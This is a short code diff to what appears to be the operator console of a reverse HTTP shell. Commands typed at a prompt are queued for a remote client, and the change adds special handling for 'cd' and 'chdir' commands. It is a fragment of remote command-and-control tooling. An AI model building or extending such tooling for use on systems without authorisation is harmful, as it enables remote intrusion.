@@ -57,7 +57,6 @@ class ReverseHTTPServerHandler(SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
         return
 
-
 def run_server(host, port):
     """
     Runs the web server listening on the host and port given.
@@ -83,7 +82,13 @@ def run_server(host, port):
     connected = True
     while connected:
         command = input(">")
-        if len(command.rstrip(' ')) > 0:
+        command=command.strip()
+        if len(command) > 0:
+            if command.find('cd')==0:
+                command="000"+command[2:len(command)].strip()
+            elif command.find('chdir')==0:
+                command="000"+command[5:len(command)].strip()
+            print(command)
             command_queue.put(command)
             if command == STOP_COMMAND:
                 connected = False
